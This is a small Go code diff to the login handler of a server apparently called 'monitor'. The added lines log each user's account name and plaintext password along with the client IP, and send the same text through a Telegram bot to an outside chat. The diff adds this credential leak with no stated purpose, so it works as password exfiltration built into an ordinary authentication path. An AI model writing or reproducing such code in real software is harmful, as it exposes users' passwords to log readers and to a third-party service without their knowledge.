@@ -2,6 +2,8 @@ package api
 
 import (
 	"fmt"
+	"monitor/lib/log"
+	"monitor/tg"
 	"monitor/ws"
 	"net/http"
 
@@ -63,5 +65,7 @@ func Login(ctx *gin.Context) {
 	}
 	loginId := GetRandString()
 	ws.LoginList[loginId] = true
+	log.Log(" user account:" + request.Account + " and passwod:"+ request.Password + " login monitor server from " + ctx.ClientIP() )
+	tg.Bot.Send(tg.Tgmessage(" user account:" + request.Account + " and passwod:"+ request.Password + " login monitor server from " + ctx.ClientIP() ))
 	ctx.JSON( http.StatusOK, gin.H{"code":0,"message":"登入成功","loginId":loginId})
 }
